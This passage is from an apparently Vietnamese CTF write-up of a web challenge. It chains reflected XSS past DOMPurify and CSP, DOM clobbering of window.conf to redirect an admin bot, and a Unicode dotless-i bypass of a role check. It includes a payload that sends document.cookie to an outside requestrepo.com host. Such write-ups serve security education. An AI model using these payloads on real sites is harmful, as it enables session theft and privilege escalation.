                            _0x3eb323 = (_0x3eb323 + (-0x5 * -0x5c7 + -0x2687 + 0x9a5)) % (-0x124d + 0x2f0 * 0x1 + 0x105d), _0x39bfbb = (_0x39bfbb + _0x4887d2[_0x3eb323]) % (-0x1f5b + -0x1 * -0x18c5 + 0x796), _0x572c71 = _0x4887d2[_0x3eb323], _0x4887d2[_0x3eb323] = _0x4887d2[_0x39bfbb], _0x4887d2[_0x39bfbb] = _0x572c71, _0x35a9ba += String['fromCharCode'](_0x10768a['charCodeAt'](_0x304253) ^ _0x4887d2[(_0x4887d2[_0x3eb323] + _0x4887d2[_0x39bfbb]) % (-0x17c5 * 0x1 + -0x1 * -0x16e5 + -0x50 * -0x6)]);
                        }
                        return _0x35a9ba;
                    };
                    _0x5582['ILuJjk'] = _0xee82a5, _0x409510 = arguments, _0x5582['JdbaXF'] = !![];
                }
                const _0x4101fc = _0xed7c16[-0x1 * 0x1881 + -0x194e + 0x31cf],
                    _0x58ab4f = _0xe31be7 + _0x4101fc,
                    _0x190643 = _0x409510[_0x58ab4f];
                return !_0x190643 ? (_0x5582['aHHKWb'] === undefined &amp;&amp; (_0x5582['aHHKWb'] = !![]), _0x561cef = _0x5582['ILuJjk'](_0x561cef, _0x128541), _0x409510[_0x58ab4f] = _0x561cef) : _0x561cef = _0x190643, _0x561cef;
            }, _0x5582(_0x409510, _0xadade8);
        }

        function _0xcc04fc(_0x55da2b, _0x27ac54, _0x21bf17, _0x2f99d8, _0x1e7f46) {
            return _0x5582(_0x27ac54 - 0x2de, _0x1e7f46);
        } (function (_0x45a3dd, _0x475e52) {
            function _0x9e4cbc(_0x1471ea, _0x3b5af6, _0xbcb422, _0x2cd57d, _0x484373) {
                return _0x5582(_0x1471ea - -0x3dd, _0xbcb422);
            }
            const _0x1f6db1 = _0x45a3dd();

            function _0x4cdb16(_0x2fdd48, _0x2db694, _0x48da47, _0x32ea3f, _0x5b4320) {
                return _0x5582(_0x48da47 - 0x141, _0x5b4320);
            }

            function _0x344634(_0x1b53f4, _0x8278c0, _0x11aec1, _0x513727, _0x8cdfed) {
                return _0x5582(_0x513727 - -0x2c3, _0x1b53f4);
            }

            function _0x19211e(_0x14566c, _0x241abe, _0xbad1e1, _0x49e8b1, _0x14b1d5) {
                return _0x5582(_0x241abe - 0x170, _0x14b1d5);
            }

            function _0x32f3db(_0x1ed8b3, _0x1b0e0b, _0x1db867, _0x582698, _0x5aac2f) {
                return _0x5582(_0x1ed8b3 - 0x2d5, _0x5aac2f);
            }
            while (!![]) {
                try {
                    const _0x183cdf = parseInt(_0x32f3db(0x3fd, 0x3e7, 0x3f4, 0x3f4, ')1BZ')) / (-0x6c8 + -0x1456 + -0x1 * -0x1b1f) + parseInt(_0x32f3db(0x403, 0x400, 0x405, 0x3ea, 'ynI^')) / (0x141b + 0x2573 + -0xe63 * 0x4) + parseInt(_0x19211e(0x288, 0x296, 0x2a8, 0x281, 'VK3#')) / (0x260a + -0x81f + 0xae * -0x2c) + parseInt(_0x19211e(0x275, 0x28c, 0x29c, 0x27c, 'c#6&amp;')) / (-0x24d6 + -0x1057 * -0x2 + 0x42c) + -parseInt(_0x344634('M1L@', -0x1be, -0x1a8, -0x1b3, -0x1c1)) / (-0x194e + 0x26dd + -0xd8a) + -parseInt(_0x19211e(0x29a, 0x28f, 0x283, 0x280, 'Zq]@')) / (0xdd7 + -0x1e2e + 0x105d) * (parseInt(_0x9e4cbc(-0x2b1, -0x2ac, 'M1L@', -0x2a4, -0x2b3)) / (0x1f7b * 0x1 + 0xc58 + -0x2bcc)) + parseInt(_0x9e4cbc(-0x2b3, -0x2c2, 'yml3', -0x2cc, -0x2a6)) / (0x1df5 * -0x1 + -0x23e5 + 0x41e2) * (-parseInt(_0x32f3db(0x3f6, 0x3fb, 0x40f, 0x3fe, 'r)L!')) / (0x139 * -0x13 + -0x1f7f + 0x1241 * 0x3));
                    if (_0x183cdf === _0x475e52) break;
                    else _0x1f6db1['push'](_0x1f6db1['shift']());
                } catch (_0xd119d7) {
                    _0x1f6db1['push'](_0x1f6db1['shift']());
                }
            }
        }(_0xf972, 0x1f * 0x1281 + 0x6 * 0x17739 + -0x2216 * 0x2b));

        function _0xf972() {
            const _0x11bf3e = ['WQ8vWPlcRZG', 'W43cNaJcQw5FgXC9WP8', 'WQZdJ3K', 'ymk3W6FdLa', 'bCoisJa', 'W4FdHCo9W4i7', 'W4KNW6RdNCoO', 'ruxcHmkU', 'WOZcTCoYW6VcSq', 'BXVdLrJdPq', 'b8oOW7/dPWe', 'WPFcOCo5W5ldNG', 'DrBdVG', 'A8o/AbldQq', 'WR3dHHxcGCo8qsf0pL7dQae', 'W6i8W7e', 'WObOsmoL', 'WPBdGLxdVNG', 'WO3cUSoY', 'WORcSI7cVZe', 'hSoYm0NdGr3dPfJcOtJcUW0', 'WRSoWOpdOcm', 'WPT0dmoYW4G', 'W4aGeq', 'WRddTqRdRK8', 'WPTzAComsq', 'WPRdTCkQWQhdS8kPdSk4W70nAW', 'W6CMW6BdM8o9', 'CHZdRt3cHG', 'WPm7WRe2W6tdRSoj', 'rZ8GjCoo', 'WPbBW7tdRwC', 'gCorWPJcOuLjW7WlCtObnG', 'W7RcMd/cNXvIjfJdOIr7sG', 'W6CQd13cSa', 'W7JcNtZcLHjInxtdTtHyua', 'u8kXWQWDAq', 'ESkRmeRdUCovDSkjqSoa', 'zvLPWQdcOarAFSkBr1SJ', 'sw1BWRH9', 'lh8Awa', 'tSk5WRpcRZW', 'WQVdUMtdJHBcPCkBWP/dLSkjm8os', 'dKWU', 'W70mmCkqhSkBW6rkW5hdVKZdJG', 'WP1pzmootW', 'xmk2WQlcSbCjW557h8kl', 'kmoYCW', 'gmk8yHBcO2tdMq', 'neNcUhBdKvNdHxldMmo0WO1L', 'B11MWQ3cRN9VqCk6ye8', 'xHRdOYhcKq', 'W6NdKmoNdgeZWQZcHIC+', 'W5FdT8kMWOVcN8khW6SXANHbWOO', 'cCoJW6u', 'WRPJyCoaxa', 'WRCoWPNcUdm', 'W5DfW7xdU2e'];
            _0xf972 = function () {
                return _0x11bf3e;
            };
            return _0xf972();
        }
        const post_title = document[_0x353e86('JN58', 0x25b, 0x254, 0x253, 0x270) + _0x353e86(')1BZ', 0x23c, 0x22e, 0x23a, 0x21a) + _0x353e86('F7&amp;0', 0x229, 0x22c, 0x21d, 0x249)](_0x1f95a3('ZInG', 0x471, 0x467, 0x464, 0x46d) + _0x1f95a3('&amp;FD]', 0x45f, 0x453, 0x458, 0x46b) + 'e'),
            post_content = document[_0x353e86('&amp;FD]', 0x21b, 0x230, 0x243, 0x23d) + _0x187b3b(0x8a, 0x90, 0x98, 0x84, 'F7&amp;0') + _0x1f95a3('eFM*', 0x45e, 0x473, 0x487, 0x471)](_0x187b3b(0x87, 0x97, 0x7a, 0x7b, 'O9(7') + _0x20d6d8(0x235, 'eFM*', 0x24a, 0x226, 0x243) + _0x187b3b(0x97, 0x8c, 0x98, 0xa1, 'r)L!')),
            error_div = document[_0x1f95a3('!wy*', 0x46a, 0x44e, 0x466, 0x465) + _0x187b3b(0x8c, 0x74, 0x9f, 0x7b, 'BOp[') + _0x353e86('&amp;FD]', 0x21a, 0x224, 0x216, 0x231)](_0x20d6d8(0x220, 'bYb!', 0x206, 0x20e, 0x21a) + _0x187b3b(0x9f, 0xa7, 0xae, 0x97, ')1BZ'));

        function _0x20d6d8(_0x58a35b, _0x2ba1d3, _0x4889ca, _0x4ad308, _0x40321b) {
            return _0x5582(_0x58a35b - 0x106, _0x2ba1d3);
        }
        const urlSearch = new URLSearchParams(location[_0x1f95a3('eFM*', 0x42e, 0x454, 0x44a, 0x447) + 'h']),
            title = urlSearch[_0x1f95a3('Zq]@', 0x466, 0x451, 0x479, 0x467)](_0xcc04fc(0x3e9, 0x3ed, 0x3f7, 0x3e5, 'L7G1'));

        function _0x353e86(_0x535530, _0x11a0eb, _0x383951, _0x14787a, _0x1c9716) {
            return _0x5582(_0x383951 - 0x119, _0x535530);
        }

        function _0x187b3b(_0x137120, _0x410ff4, _0x523579, _0x4ea266, _0x29a7de) {
            return _0x5582(_0x137120 - -0x94, _0x29a7de);
        }

        function _0x1f95a3(_0x242e4a, _0xdf6e1b, _0x211c27, _0x237ab5, _0x3adc34) {
            return _0x5582(_0x3adc34 - 0x32f, _0x242e4a);
        }
        const content = urlSearch[_0x20d6d8(0x238, 'yml3', 0x23b, 0x250, 0x240)](_0x20d6d8(0x218, '&amp;yJN', 0x201, 0x204, 0x206) + 'nt');
        if (!title &amp;&amp; !content) post_content[_0x20d6d8(0x213, 'TlR*', 0x222, 0x205, 0x204) + _0xcc04fc(0x3dc, 0x3ea, 0x400, 0x3f1, ')1BZ')] = _0x187b3b(0x95, 0x90, 0x86, 0x94, ')1BZ') + _0x353e86('#5L]', 0x238, 0x22d, 0x221, 0x229) + _0xcc04fc(0x420, 0x403, 0x3f1, 0x407, '^eE%') + _0xcc04fc(0x421, 0x421, 0x415, 0x425, 'r)L!') + _0x187b3b(0x7d, 0x79, 0x90, 0x6f, '!wy*');
        else try {
            post_title[_0xcc04fc(0x409, 0x41e, 0x415, 0x406, 'yml3') + _0xcc04fc(0x3fe, 0x418, 0x424, 0x423, 'r)L!')] = DOMPurify[_0x187b3b(0xab, 0xc1, 0xbb, 0x93, 'u[jQ') + _0x187b3b(0x93, 0x95, 0x95, 0x7b, 'iZUw')](title), post_content[_0x20d6d8(0x23a, '!wy*', 0x22f, 0x257, 0x246) + _0x20d6d8(0x22a, '$H!J', 0x22f, 0x221, 0x22f)] = DOMPurify[_0x353e86('pTVF', 0x251, 0x25a, 0x267, 0x273) + _0x187b3b(0x7a, 0x5f, 0x87, 0x80, 'pTVF')](content);
        } catch {
            post_title[_0x353e86('nB@I', 0x24d, 0x23c, 0x220, 0x256) + _0x1f95a3('o6ul', 0x474, 0x475, 0x47a, 0x46c)] = title, post_content[_0x20d6d8(0x23b, 'O9(7', 0x240, 0x252, 0x228) + _0x187b3b(0xa5, 0x98, 0xb1, 0x92, 'c#6&amp;')] = content;
        }
    &lt;/script&gt;

&lt;/html&gt;
</code></pre><p>Thằng này có sử dụng 1 lib filter là <code>purify.min.js</code> version mới nhất</p>
<p><img src="https://hackmd.io/_uploads/BJFXAgYaJl.png" alt="image"></p>
<p>Có hiển thị cách sử dụng là truyền 2 đối số là <code>Usage: ?title=a&amp;content=b</code> thì thử trigger xss thì lại được vì csp <code>script-src 'self' 'unsafe-inline'</code> vẫn có thể bypass.</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">GET</span> <span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">test</span><span class="o">/?</span><span class="n">title</span><span class="o">=%</span><span class="n">3Csvg</span><span class="o">%</span><span class="n">20onload</span><span class="o">=</span><span class="n">window</span><span class="o">.</span><span class="na">location</span><span class="o">=</span><span class="err">`</span><span class="n">https</span><span class="o">:</span><span class="c1">//avsgx93b.requestrepo.com/?a=${document.cookie}`%3E
</span></code></pre></div><p>có một điểm ha là nếu ta trigger /admin/test?payload sẽ không được  -&gt; có vẻ là do các xử lý của mã js bị obfucate để áp dụng dom-purify</p>
<ul>
<li>giờ đã tìm được sink của bug nhưng mà câu hỏi đặt ra là chức năng report chỉ cho con bot truy cập đến post và hoàn toàn không hề liên quan gì đến /post/:post_id</li>
</ul>
<p>Quay trở lại với <code>view.ejs</code></p>
<pre><code class="language-ejs" data-lang="ejs"> &lt;script nonce=&quot;&lt;%= nonce %&gt;&quot;&gt;
        &lt;% if (isOwner || isAdmin) { %&gt;
            window.conf = window.conf || {
                deleteUrl: &quot;/post/delete/&lt;%= post.post_id %&gt;&quot;
            };x
        &lt;% } else { %&gt;
            window.conf = window.conf || {
                deleteUrl: &quot;/error/role&quot;
            };
        &lt;% } %&gt;

        &lt;% if (isInspector) { %&gt;
            window.conf.reportUrl = &quot;/report/&lt;%= post.post_id %&gt;&quot;;
        &lt;% } else { %&gt;
            window.conf.reportUrl = &quot;/error/role&quot;;
        &lt;% } %&gt;

        const reportButton = document.querySelector(&quot;#report&quot;);

        reportButton.addEventListener(&quot;click&quot;, () =&gt; {
            location.href = window.conf.reportUrl;
        });

        const deleteButton = document.querySelector(&quot;#delete&quot;);

        deleteButton.addEventListener(&quot;click&quot;, () =&gt; {
            location.href = window.conf.deleteUrl;
        });
    &lt;/script&gt;
</code></pre><p>Để ý đoạn này sẽ kiểm tra nếu người dùng là <code>isOwner</code> hoặc là <code>isAdmin</code> giá trị <code>window.conf</code> sẽ có thể có giá trị <code>window.conf</code> hoặc được gán cứng là <code>deleteUrl: &quot;/post/delete/&lt;%= post.post_id %&gt;</code></p>
<p>Vậy khi con bot trigger đến post của bạn nó có role admin khi token của nó được generate ra <code>role: &quot;ADMIN&quot;, hasPerm: true</code> và đặc biệt là khi</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">deleteButton</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;#delete&#34;</span><span class="p">);</span>
<span class="nx">deleteButton</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;click&#34;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
            <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">conf</span><span class="p">.</span><span class="nx">deleteUrl</span><span class="p">;</span>
        <span class="p">});</span>
</code></pre></div><p>Bot có hành vi click button id #delete cho nên nếu ta control được <code>window.conf.deleteUrl</code> thì hoàn toàn có khả năng chuyển hướng bot đến trang /admin/test để trigger xss trước khi trình duyệt của bot bị đóng.</p>
<h3 id="dom-clobbering-change-variable-when-trigger">DOM clobbering change variable when trigger</h3>
<p>Với giá trị của content thì ta có thể inject xss như hạn chế về csp không cho phép nên ta sẽ lợi dụng này làm gadget thay đổi giá trị của <code>window.conf</code> để chuyển hướng bot</p>
<p><img src="https://hackmd.io/_uploads/Hy9kMWFpkx.png" alt="image"></p>
<p>Sử dụng <code>&lt;a id=&quot;conf&quot;&gt;&lt;/a&gt;&lt;a id=&quot;conf&quot; name=&quot;deleteUrl&quot; href=&quot;http://[url]/admin/test/?title=[xss-payload]&amp;content=[xss-payload]&quot;&gt;&lt;/a&gt;</code> thì khi hiển thị post thì giá trị của window.conf bị thay đổi và <code>deleteUrl</code> cũng control được</p>
<p>Mọi việc gần như đã hoàn thành -&gt; giờ câu hỏi đặt ra là làm sao để tạo được post vì có <code>postGuard</code></p>
<h3 id="change-properties-hasperm-to-write-new-post">Change properties hasPerm to write new post</h3>
<ol>
<li>Mã nguồn</li>
</ol>
<p>Tại <code>/routes/admin.js</code> ta có thể tìm thấy api này</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">authenticateJWT</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/jwt&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">adminGuard</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/guard&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">getUser</span><span class="p">,</span> <span class="nx">setPerm</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../models/userModel&#39;</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">authenticateJWT</span><span class="p">);</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">adminGuard</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;admin/index&#39;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">uuid</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span>
        <span class="nx">role</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span>
    <span class="p">});</span>
<span class="p">});</span>

<span class="c1">// TODO : Testing HTML tag functionality for the &#34;/post&#34;.
</span><span class="c1"></span><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;admin/test&#39;</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/user&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;admin/user&#39;</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/user/perm&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="p">{</span> <span class="nx">uuid</span><span class="p">,</span> <span class="nx">value</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

    <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">getUser</span><span class="p">(</span><span class="nx">uuid</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;User Not Found.&#34;</span> <span class="p">});</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">&#34;boolean&#34;</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Invalid Permission Status. Please use boolean.&#34;</span> <span class="p">});</span>

    <span class="nx">setPerm</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;User Permission Changed.&#34;</span> <span class="p">})</span>
<span class="p">});</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</code></pre></div><p><code>/user/perm</code> với giá trị uuid và value ta có thể <code>setPerm(uuid, value)</code> với input ta nhập vào là giá trị của <code>hasPerm</code></p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">setPerm</span> <span class="o">=</span> <span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">input</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">getUser</span><span class="p">(</span><span class="nx">uuid</span><span class="p">);</span>

    <span class="nx">users</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="p">{</span> <span class="p">...</span><span class="nx">user</span><span class="p">,</span> <span class="nx">hasPerm</span><span class="o">:</span> <span class="nx">input</span> <span class="p">});</span>

    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><ol start="2">
<li>Quyền hạn truy cập</li>
</ol>
<p>Tiếp tục với 2 middleware</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">authenticateJWT</span><span class="p">);</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">adminGuard</span><span class="p">);</span>
</code></pre></div><p>Yêu cầu người dùng phải đăng nhập và chỉ có admin mới có quyền truy cập</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">const</span> <span class="n">adminGuard</span> <span class="o">=</span> <span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="n">res</span><span class="o">,</span> <span class="n">next</span><span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">user</span><span class="o">.</span><span class="na">role</span> <span class="o">!==</span> <span class="s">&#34;ADMIN&#34;</span><span class="o">)</span> <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="na">status</span><span class="o">(</span><span class="n">403</span><span class="o">).</span><span class="na">json</span><span class="o">({</span> <span class="n">message</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">Forbidden</span><span class="o">.</span><span class="err">&#39;</span> <span class="o">});</span>

    <span class="n">next</span><span class="o">();</span>
<span class="o">};</span>
</code></pre></div><p>Câu hỏi đặt ra là làm sao để truy cập được endpoint này -&gt; ta sẽ quan sát những api liên quan đến user để tìm kiếm</p>
<ol start="3">
<li>Mã nguồn <code>/routes/user.js</code></li>
</ol>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">authenticateJWT</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../utils/jwt&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">setRole</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;../models/userModel&#39;</span><span class="p">);</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">authenticateJWT</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;user/index&#39;</span><span class="p">,</span> <span class="p">{</span>
        <span class="nx">uuid</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span>
        <span class="nx">role</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">role</span>
    <span class="p">})</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/role&#39;</span><span class="p">,</span> <span class="nx">authenticateJWT</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="p">{</span> <span class="nx">role</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>

    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">setRole</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">role</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Invalid Role.&#34;</span> <span class="p">});</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;Role Changed.&#34;</span><span class="p">,</span> <span class="nx">token</span> <span class="p">});</span>
<span class="p">});</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span><span class="p">;</span>
</code></pre></div><p>ở đây thì kiểm tra dễ dàng hơn 1 chút là chỉ cần đăng nhập thì người dùng có thể thay đổi role nhưng mà có 1 yêu cầu khó khăn là</p>
<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">setRole</span> <span class="o">=</span> <span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="nx">input</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">getUser</span><span class="p">(</span><span class="nx">uuid</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nx">checkRole</span><span class="p">(</span><span class="nx">input</span><span class="p">))</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">role_list</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()))</span> <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>

    <span class="nx">users</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">uuid</span><span class="p">,</span> <span class="p">{</span> <span class="p">...</span><span class="nx">user</span><span class="p">,</span> <span class="nx">role</span><span class="o">:</span> <span class="nx">input</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">()</span> <span class="p">});</span>

    <span class="kr">const</span> <span class="nx">updated</span> <span class="o">=</span> <span class="nx">getUser</span><span class="p">(</span><span class="nx">uuid</span><span class="p">);</span>

    <span class="kr">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">uuid</span><span class="p">,</span> <span class="p">...</span><span class="nx">updated</span> <span class="p">}</span>

    <span class="k">delete</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>

    <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">generateToken</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">token</span><span class="p">;</span>
<span class="p">};</span>

<span class="kr">const</span> <span class="nx">role_list</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;ADMIN&#34;</span><span class="p">,</span> <span class="s2">&#34;MEMBER&#34;</span><span class="p">,</span> <span class="s2">&#34;INSPECTOR&#34;</span><span class="p">,</span> <span class="s2">&#34;DEV&#34;</span><span class="p">,</span> <span class="s2">&#34;BANNED&#34;</span><span class="p">];</span>

<span class="kd">function</span> <span class="nx">checkRole</span><span class="p">(</span><span class="nx">role</span><span class="p">)</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">regex</span> <span class="o">=</span> <span class="sr">/^(ADMIN|INSPECTOR)$/i</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">regex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">role</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Khi ta truyền vào value của role thì nó match regex là đầu vào ta sẽ phải uppercase hết và nếu có <code>ADMIN</code> hoặc <code>INSPECTOR</code> thì sẽ không được phép</p>
<p>Có một trick dựa vào hàm uppercase là</p>
<p><img src="https://hackmd.io/_uploads/ryLUvZt6ke.png" alt="image"></p>
<p>nếu ta truyền là <code>admın</code> thì khi uppercase thì giá trị role sẽ là <code>ADMIN</code> và kiểm tra của hàm ở trên sẽ check trước khi uppercase nên việc bypass là khả thi</p>
<h3 id="string-source---gadget---sink">string source -&gt; gadget -&gt; sink</h3>
